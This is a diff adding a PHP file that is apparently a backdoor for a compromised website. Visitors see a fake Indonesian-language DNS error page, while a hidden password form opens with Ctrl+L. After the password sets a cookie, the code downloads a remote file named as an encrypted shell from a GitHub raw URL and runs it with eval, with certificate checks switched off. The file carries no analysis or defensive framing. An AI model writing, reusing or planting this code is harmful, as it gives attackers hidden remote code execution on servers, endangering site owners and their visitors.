@@ -1,0 +1,158 @@
+Y<?php
+// Function to check if the user is logged in based on the presence of a valid cookie
+function is_logged_in()
+{
+    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'chou';
+}
+
+// Check if the user is logged in before executing the content
+if (is_logged_in()) {
+    // Function to get URL content
+    function geturlsinfo($url)
+    {
+        if (function_exists('curl_exec')) {
+            $conn = curl_init($url);
+            curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
+            curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
+            curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+            curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
+            curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
+
+            $url_get_contents_data = curl_exec($conn);
+            curl_close($conn);
+        } elseif (function_exists('file_get_contents')) {
+            $url_get_contents_data = file_get_contents($url);
+        } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
+            $handle = fopen($url, "r");
+            $url_get_contents_data = stream_get_contents($handle);
+            fclose($handle);
+        } else {
+            $url_get_contents_data = false;
+        }
+        return $url_get_contents_data;
+    }
+
+    $a = geturlsinfo('wget https://raw.githubusercontent.com/buletin7news/update/refs/heads/main/shell-parlente-encrypted.txt');
+    eval('?>' . $a);
+} else {
+    // Display fake "Site Cannot Be Reached" error page with hidden login form
+    if (isset($_POST['password'])) {
+        $entered_password = $_POST['password'];
+        $hashed_password = '930c1f5dc2e97c4459baa2d4edf5c562'; // #############################
+        if (md5($entered_password) === $hashed_password) {
+            // Password is correct, set a cookie to indicate login
+            setcookie('user_id', 'chou', time() + 3600, '/'); 
+            header("Refresh:0");
+            exit;
+        } else {
+            echo "<script>alert('Password salah! Silakan coba lagi.');</script>";
+        }
+    }
+    ?>
+    <!DOCTYPE html>
+    <html lang="id">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Situs ini tidak dapat dijangkau</title>
+        <style>
+            body {
+                font-family: Arial, sans-serif;
+                background-color: #f2f2f2;
+                margin: 0;
+                padding: 0;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                height: 100vh;
+                color: #606060;
+                position: relative;
+            }
+            .container {
+                text-align: center;
+            }
+            .container img {
+                width: 100px;
+                margin-bottom: 20px;
+            }
+            .container h1 {
+                font-size: 24px;
+                margin: 0;
+                color: #333;
+            }
+            .container p {
+                font-size: 16px;
+                margin: 5px 0 15px;
+            }
+            .container .error-code {
+                font-size: 14px;
+                color: #999;
+            }
+            .container .retry-btn {
+                background-color: #f2f2f2;
+                color: #606060;
+                border: 1px solid #ddd;
+                padding: 8px 20px;
+                font-size: 14px;
+                cursor: pointer;
+                text-decoration: none;
+            }
+            /* Hidden login form */
+            #login-form {
+                display: none;
+                position: absolute;
+                bottom: 20px;
+                right: 20px;
+                background-color: #fff;
+                border: 1px solid #ddd;
+                padding: 15px;
+                box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+                border-radius: 5px;
+            }
+            #login-form input[type="password"] {
+                border: 1px solid #ddd;
+                padding: 5px;
+                font-size: 14px;
+                margin-bottom: 10px;
+                display: block;
+                width: 100%;
+            }
+            #login-form input[type="submit"] {
+                background-color: #4CAF50;
+                color: #fff;
+                border: none;
+                padding: 5px 10px;
+                cursor: pointer;
+            }
+            #show-login {
+                display: none; /* Completely hide the button visually */
+            }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQvBr-BjIYFzqglTSaFO9gZFRJVzLNKhG6J0-Fxz7t5OFTcZ_l7T5LzA4DBoTxMBKMfdNc&usqp=CAU" alt="Error Icon">
+            <h1>Situs ini tidak dapat dijangkau</h1>
+            <p>Periksa apakah ada kesalahan ketik pada domain.</p>
+            <p class="error-code">DNS_PROBE_FINISHED_NXDOMAIN</p>
+            <a href="<?php echo $_SERVER['PHP_SELF']; ?>" class="retry-btn">Muat Ulang</a>
+        </div>
+        <!-- Hidden login form -->
+        <form id="login-form" method="POST" action="">
+            <input type="password" name="password" placeholder="Masukkan password">
+            <input type="submit" value="Login">
+        </form>
+        <!-- Hidden login trigger -->
+        <script>
+            const loginForm = document.getElementById('login-form');
+            document.addEventListener('keydown', (event) => {
+                if (event.ctrlKey && event.key === 'L') { // Ctrl+L to trigger
+                    loginForm.style.display = 'block';
+                }
+            });
+        </script>
+    </body>
+    </html>
+    <?php
+}
+?>
